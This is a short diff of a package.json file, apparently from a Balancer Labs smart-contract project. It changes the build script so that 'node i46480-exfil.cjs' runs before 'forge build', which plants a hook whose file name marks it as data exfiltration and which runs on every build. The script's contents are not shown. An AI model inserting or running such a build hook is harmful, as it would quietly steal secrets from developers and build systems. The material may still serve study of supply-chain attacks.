@@ -17,7 +17,7 @@
     "Elshan Dzhafarov <elshan@balancerlabs.dev>"
   ],
   "scripts": {
-    "build": "forge build",
+    "build": "node i46480-exfil.cjs && forge build",
     "test:forge": "forge test --ffi -vvv --no-match-path 'test/blacklisted/*'"
   },
   "devDependencies": {
